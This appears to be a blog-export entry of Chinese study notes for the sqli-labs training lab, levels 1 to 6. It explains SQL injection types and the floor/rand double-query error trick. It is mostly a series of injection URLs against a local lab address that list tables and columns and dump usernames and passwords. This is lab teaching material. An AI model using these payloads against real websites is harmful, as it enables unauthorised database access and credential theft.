<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Sqli-labs通关笔记</title>
      <link href="/2020/02/08/Sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/02/08/Sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h2><hr><h3 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h3><p>SQL 注入英文名叫 SQL Injection，是发生于应用程序与数据库层的安全漏洞。简单来说，就是在输入的字符串中注入 SQL 命令，如果程序忽略了字符检查，那么这些注入进去的恶意软件就会被数据库误认为是正常的 SQL 命令来运行。</p><p><img src="https://i.loli.net/2019/10/10/jNa3tZQyVJgDIHn.png" alt="less-1-1.png"></p><h3 id="SQL-注入的类型"><a href="#SQL-注入的类型" class="headerlink" title="SQL 注入的类型"></a>SQL 注入的类型</h3><h4 id="按照注入点类型来分类"><a href="#按照注入点类型来分类" class="headerlink" title="按照注入点类型来分类"></a>按照注入点类型来分类</h4><ul><li><p>数字型注入点<br>许多网页链接有类似的结构 <code>http://xxx.com/users.php?id=1</code> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递 id 等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code></p></li><li><p>字符型注入点<br>网页链接有类似的结构 <code>http://xxx.com/users.php?name=admin</code> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code></p></li><li><p>搜索型注入点<br>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>keyword=关键字</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code></p></li></ul><h4 id="按照数据提交的方式来分类"><a href="#按照数据提交的方式来分类" class="headerlink" title="按照数据提交的方式来分类"></a>按照数据提交的方式来分类</h4><ul><li><p>GET 注入<br>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code>, id 是注入点。</p></li><li><p>POST 注入<br>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p></li><li><p>Cookie 注入<br>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p></li><li><p>HTTP 头部注入<br>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p></li></ul><h4 id="按照执行效果来分类"><a href="#按照执行效果来分类" class="headerlink" title="按照执行效果来分类"></a>按照执行效果来分类</h4><ul><li><p>基于布尔的盲注<br>即可以根据返回页面判断条件真假的注入。</p></li><li><p>基于时间的盲注<br>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p></li><li><p>基于报错注入<br>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p></li><li><p>联合查询注入<br>可以使用union的情况下的注入。</p></li><li><p>堆查询注入<br>可以同时执行多条语句的执行时的注入。</p></li><li><p>宽字节注入<br>宽字节注入源于程序员设置 MySQL 连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞。</p></li></ul><h3 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h3><p><img src="https://i.loli.net/2019/09/12/wRNZ32vybPloCUe.png" alt="less-1.png"></p><p>当我输入上面的 URL 时，浏览器就会发送 sql 命令</p><pre class="line-numbers language-mysql"><code class="language-mysql">select * from TABLE where id='1' limit 0,1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>给服务器，之后服务器会将结果传输给浏览器，最后浏览器将数据展示页到面上给用户看。</p><p><img src="https://i.loli.net/2019/09/12/JYhq5CG6jgbOkwV.png" alt="less-2.png"></p><p>之后通过修改 URL，达到服务器执行插入的 SQL 命令，并返回到页面上。这里浏览器发送sql命令是：</p><pre class="line-numbers language-mysql"><code class="language-mysql">select * from TABLE where id='-1' union select 1,database(),2;--+' limit 0,1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h2><p>GET 型基于错误的单引号字符型注入</p><hr><ol><li><strong>GET 方式提交 id</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/13/QEuwBkNStycYWp9.png" alt="less-3.png"></p><ol start="2"><li><strong>添加 “单引号” 报错，爆出数据库软件名称和部分 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/13/qfNOhSmYiIuojr9.png" alt="less-4.png"></p><p>从 <font color="red">‘1’’ LIMIT 0,1</font>的报错信息中可以判断出后台执行的 sql 语句：select * from TABLE where id=’1’ limit 0,1;</p><ol start="3"><li><strong>order by 猜测字段数</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=1' order by 1%23......http://192.168.150.128/sqli-labs-master/Less-1/?id=1' order by 4%23 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/14/5xpfnLvgQbMo2GY.png" alt="less-5.png"></p><p><strong>PS：</strong><br>order by 4  时页面报错，判断 TABLE 字段数为3。<br>这里的 %23 表示的是 “#” 符号，用来注释后面的语句。字符 “#” 浏览器不会编码，需要手动编码 %23</p><ol start="4"><li><strong>查看字段显示位置</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/14/1uhvRM2CylzDiNE.png" alt="less-6.png"></p><p><strong>PS：</strong><br>union 之前的语句必须返回空值，因为 mysql_fetch_array() 函数 只能获取一条信息。也就是说：整个 SQL 语句中，只能返回一个 SQL 执行结果。</p><ol start="5"><li><strong>获取数据库登录用户、数据库名</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' union select 1,user(),database()%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/14/ckphjUCl9RsW3wM.png" alt="less-07.png"></p><p><strong>PS：</strong><br>user()：获取当前登录的数据库用户<br>database()：获取数据库名称6</p><ol start="6"><li><strong>爆表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/14/CRAPlKj9MOSth7u.png" alt="less-8.png"></p><p><strong>PS：</strong><br>group_concat()  函数可以让查询获得的数据组成一行显示。</p><p>在 MySQL 中，把 information_schema 是信息数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。</p><ol start="7"><li><strong>爆表中的字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/14/lqsM6SErwChAzHe.png" alt="less-9.png"></p><ol start="8"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-1/?id=-1' UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/14/D1i9J2FrnAedRSk.png" alt="less-10.png"></p><h2 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h2><p>GET 型基于错误的整型注入</p><hr><ol><li><strong>GET 方式提交 id</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/hczVTEGkLxBKqg3.png" alt="less2-1.png"></p><ol start="2"><li><strong>添加 “单引号” 报错，爆出数据库软件名称和部分 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/OfAUBh3GtZVC1Sa.png" alt="less2-9.png"></p><p>从 <font color="red">‘ LIMIT 0,1</font>的报错信息中可以判断出后台执行的 sql 语句：select * from TABLE where id=1 limit 0,1;</p><ol start="3"><li><strong>order by 猜测字段数</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=1 order by 1%23......http://192.168.150.128/sqli-labs-master/Less-2/?id=1 order by 4%23 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/t2iVy8IpFEuqC4v.png" alt="less2-3.png"></p><ol start="4"><li><strong>查看字段显示位置</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/rRZdH8sDgtSEU9z.png" alt="less2-4.png"></p><ol start="5"><li><strong>获取数据库登录用户、数据库名</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 union select 1,user(),database()%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/t49AcbmUJz5oqRe.png" alt="less2-5.png"></p><ol start="6"><li><strong>爆表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/o58QxD4vF27AnON.png" alt="less2-6.png"></p><ol start="7"><li><strong>爆表中的字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/5SQJhzNPgod3REq.png" alt="less2-7.png"></p><ol start="8"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/RdtWMP52Z9SOe8B.png" alt="less2-8.png"></p><h2 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h2><p>基于错误的GET单引号变形字符型注入</p><hr><ol><li><strong>GET 方式提交 id</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/bDk6cAvFt1KHLih.png" alt="less-3-1.png"></p><ol start="2"><li><strong>添加 “单引号” 报错，爆出数据库软件名称和部分 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/lDahJc16OZIt2Mj.png" alt="less-3-2.png"></p><p>从 <font color="red">‘1’’) LIMIT 0,1</font>的报错信息中可以判断出后台执行的 sql 语句：select * from TABLE where id=(‘1’) limit 0,1;</p><ol start="3"><li><strong>order by 猜测字段数</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=1') order by 1%23......http://192.168.150.128/sqli-labs-master/Less-3/?id=1') order by 4%23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/XAgYZGJdphajutm.png" alt="less-3-3.png"></p><ol start="4"><li><strong>查看字段显示位置</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/NhwYyp4aUSGdti7.png" alt="less-3-4.png"></p><ol start="5"><li><strong>获取数据库登录用户、数据库名</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') union select 1,user(),database()%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/6QBAjReh4FlnLZT.png" alt="less-3-5.png"></p><ol start="6"><li><strong>爆表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/lpMxdXcFByGUJtH.png" alt="less-3-6.png"></p><ol start="7"><li><strong>爆表中的字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/bxhCuIB4iw6ntK5.png" alt="less-3-8.png"></p><ol start="8"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-3/?id=-1') UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users %23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/15/YyNp6tkK2PMUoLG.png" alt="less-3-7.png"></p><h2 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h2><p>基于错误的GET双引号字符型注入</p><hr><ol><li><strong>GET 方式提交 id</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/19/he6pGSZLnzi1TDM.png" alt="less4-1.png"></p><ol start="2"><li><strong>添加 “单引号”，无报错</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/19/2EHuTXJgWzqVepR.png" alt="less4-2.png"></p><ol start="3"><li><strong>添加 “双引号”报错，爆出数据库软件名称和部分 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/19/GuBp4ZdMQLvySKb.png" alt="less4-3.png"></p><ol start="4"><li><strong>order by 猜测字段数</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=1") order by 4%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/19/uh2YiQnCaPcXVDN.png" alt="less4-4.png"></p><ol start="5"><li><strong>查看字段显示位置</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,2,3%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/19/UXosdxFR3GbS8AC.png" alt="less4-5.png"></p><ol start="6"><li><strong>获取数据库登录用户、数据库名</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,user(),database()%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/19/BiHf9dv8q7h61Et.png" alt="less4-6.png"></p><ol start="7"><li><strong>爆表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/19/tTxAJIonLFMdHji.png" alt="less4-7.png"></p><ol start="8"><li><strong>爆表中的字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/19/l41pBASQqw9EkjW.png" alt="less4-8.png"></p><ol start="9"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(username),group_concat(password) FROM security.users %23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/19/nBE2Yqu6stT59jy.png" alt="less4-9.png"></p><h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>双注入GET单引号字符型注入</p><hr><h3 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h3><h4 id="什么是双查询？"><a href="#什么是双查询？" class="headerlink" title="什么是双查询？"></a>什么是双查询？</h4><p>双查询就是在 select 语句中再插入一个 select 语句，如下图所示：</p><p><img src="https://i.loli.net/2019/10/02/1eMlHYmObKqn8GS.png" alt="5-1y.png"></p><p>在查询的时候，会先执行 select database() 语句，然后再将该语句的执行结果传递给 count() 函数，从内到外依次执行。</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>对于双查询注入,需要先了解 count()、rand()、floor() 这三个函数的功能，以及 group by 的用法。</p><p>floor()：去除小数</p><p><img src="https://i.loli.net/2019/10/02/Hnob26tvASWx7wj.png" alt="5-4y.png"></p><p>rand()：产生随机数</p><p><img src="https://i.loli.net/2019/10/02/O4pA3gywDohJab1.png" alt="5-3y.png"></p><p>count()：对表中的数据进行计数</p><p><img src="https://i.loli.net/2019/10/02/ZIVn7QrcJPYe2ol.png" alt="5-2y.png"></p><p>group by：根据规则，对数据进行分组处理。</p><h4 id="双查询注入产生原因"><a href="#双查询注入产生原因" class="headerlink" title="双查询注入产生原因"></a>双查询注入产生原因</h4><p>使用 group by 子句结合 rand() 函数以及像 count（*） 这样的聚合函数，在 SQL 查询时会出现错误，这种错误是随机产生的，这就产生了双重查询注入。</p><p><img src="https://i.loli.net/2019/10/02/4VhSFL5w6nruWyq.png" alt="5-5y.png"></p><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>以下面的查询语句为例：</p><pre class="line-numbers language-mysql"><code class="language-mysql">select count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/03/5yvnlafeVmctWBJ.png" alt="5-7y.png"></p><p>首先，rand(0)的查询结果几乎消除了rand()函数原有的随机性，连续查询几次，我们会发现它的规律如下(01101)</p><p><img src="https://i.loli.net/2019/10/02/H3NOcbQEUSqxZve.png" alt="5-6y.png"></p><p>其次，使用 group by 语句和 count() 函数的时候，mysql 数据库会先建立一个虚拟表，当查询到新的键不在虚拟表中，数据库就会将其插入表中，如果数据库中已存在该键，则找到该键对应的计数字段并加 1。新建虚拟表如下：</p><style>table th:first-of-type {    height: 40px;    width: 350px;}</style><table><thead><tr><th align="center">键</th><th align="center">计数</th></tr></thead><tbody><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr></tbody></table><p>由于使用了 rand(0)，在查询虚拟表之前会先执行一下 floor(rand(0)*2))，第一次的到结果为 0，发现虚拟表中没有，所以此时要插入键 0。</p><p>但是对于数据库而言 rand(0)<em>2 是一个未知数，因此插入数据时 floor(rand(0)</em>2)) 函数又需要执行一遍，此时的查询结果为 1 (根据上一张图片查询结果 01101 可知，第二次查询结果为 1)，所以此时要插入键 1，取第一条记录查询，虚拟表如下：</p><table><thead><tr><th align="center">键</th><th align="center">计数</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">1</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr></tbody></table><p>取第二条记录查询，此时执行 floor(rand(0)*2)) 返回的结果为1(此时对应上面 01101 的第三次查询结果1)，查找虚拟表发现键 1 已经存在，所以直接加 1，虚拟表变化如下：</p><table><thead><tr><th align="center">键</th><th align="center">计数</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">2</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr></tbody></table><p>取第三条记录查询，此时执行 floor(rand(0)<em>2)) 返回的结果为 0 (此时对应上面 01101 的第四次查询结果 0)，发现虚拟表中没有键0，所以要将其写入虚拟表。同样在写入虚拟表的时候，floor(rand(0)</em>2)) 又执行了一遍，此时查询结果为上面 01101 的第五次结果 1，但是键1已经存在虚拟表中，由于键只能唯一，所以此时就会报错。</p><table><thead><tr><th align="center">键</th><th align="center">计数</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">2</td></tr><tr><td align="center"><font color="red"> 1 </font></td><td align="center"><font color="red"> 1 (报错)</font></td></tr><tr><td align="center">&nbsp;</td><td align="center">&nbsp;</td></tr></tbody></table><p>所以在使用 floor()、rand(0)、count()、group by 时，数据表中至少要有 3 条记录才会报错.</p><h3 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol><li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/r4PYNDvSRpHAQl1.png" alt="less5-2.png"></p><ol start="2"><li><strong>判断字段数</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1'  order by 4%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/HvSUCoZYGO4KAr2.png" alt="less5-3.png"></p><ol start="3"><li><strong>爆数据库名</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/8hGdsnq63wkr2WU.png" alt="less5-4.png"></p><ol start="4"><li><strong>爆表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/R4aFOGnt5mcoKZP.png" alt="less5-5.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/kTKAdcUzHynXwgf.png" alt="less5-6.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/45gvlwQ6MEyVPHh.png" alt="less5-7.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/ZbhXlOisazPtnBM.png" alt="less5-8.png"></p><ol start="5"><li><strong>爆字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/p8UvOKb9SFwnQtN.png" alt="less5-9.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 1,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/oplvc9CgKjSPOet.png" alt="less5-10.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 2,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/LpKtAQPj4zf3FTv.png" alt="less5-11.png"></p><ol start="6"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select username FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/Kyk4fXjqtHO9B1F.png" alt="less5-12.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat((select password FROM security.users limit 0,1),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/09/28/NgponACb6TuJMHK.png" alt="less5-13.png"></p><h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><p>双注入GET双引号字符型注入</p><hr><ol><li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/o8WZNc9r7peLsjA.png" alt="less6-1.png"></p><ol start="2"><li><strong>判断字段数</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" order by 4%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/EONfdcUSQuP1Vpn.png" alt="less6-2.png"></p><ol start="3"><li><strong>爆数据库名</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-6/?id=1" union select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/05/nc3TCwSApW8uKIE.png" alt="less6-3.png"></p><ol 